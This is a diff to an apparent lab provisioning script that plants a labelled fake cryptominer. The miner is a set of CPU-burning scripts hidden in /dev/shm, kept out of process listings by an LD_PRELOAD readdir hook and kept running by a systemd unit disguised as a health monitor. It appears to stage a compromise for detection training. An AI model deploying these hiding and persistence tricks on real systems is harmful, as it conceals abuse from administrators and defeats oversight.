@@ -21,16 +21,27 @@ provision:
       # Create a fake cryptominer that uses CPU
       mkdir -p /dev/shm/.hidden
       
+      # Simple CPU burner using yes command
       cat > /dev/shm/.hidden/xmrig << 'MINER_EOF'
       #!/bin/bash
-      # Fake XMRig miner - just burns CPU
-      while true; do
-          stress-ng --cpu 1 --cpu-load 80 --timeout 60s --quiet &
-          sleep 60
-      done
+      # Burn CPU with multiple yes processes
+      yes > /dev/null &
+      yes > /dev/null &
+      yes > /dev/null &
+      wait
       MINER_EOF
       
       chmod +x /dev/shm/.hidden/xmrig
+      
+      # Backup burner using sha256sum
+      cat > /dev/shm/.hidden/miner-worker << 'WORKER_EOF'
+      #!/bin/bash
+      while true; do
+          dd if=/dev/zero bs=1M count=100 2>/dev/null | sha256sum > /dev/null
+      done
+      WORKER_EOF
+      
+      chmod +x /dev/shm/.hidden/miner-worker
       
       # Create a wrapper that hides the process from ps
       # We'll use a LD_PRELOAD trick to filter readdir
@@ -50,9 +61,12 @@ provision:
           
           struct dirent *dir;
           while ((dir = original_readdir(dirp)) != NULL) {
-              // Hide xmrig and stress-ng processes
+              // Hide xmrig, miner-worker, yes, dd, and sha256sum processes
               if (strstr(dir->d_name, "xmrig") != NULL ||
-                  strstr(dir->d_name, "stress-ng") != NULL) {
+                  strstr(dir->d_name, "miner") != NULL ||
+                  strstr(dir->d_name, "yes") != NULL ||
+                  strstr(dir->d_name, "sha256sum") != NULL ||
+                  strstr(dir->d_name, "dd") != NULL) {
                   continue;
               }
               return dir;
@@ -74,6 +88,7 @@ provision:
       
       # Start the miner
       nohup /dev/shm/.hidden/xmrig > /dev/null 2>&1 &
+      nohup /dev/shm/.hidden/miner-worker > /dev/null 2>&1 &
       
       # Add persistence via systemd
       cat > /etc/systemd/system/system-health-monitor.service << 'SYSTEMD_EOF'
@@ -84,6 +99,7 @@ provision:
       [Service]
       Type=forking
       ExecStart=/dev/shm/.hidden/xmrig
+      ExecStartPost=/dev/shm/.hidden/miner-worker
       Restart=always
       RestartSec=10
       
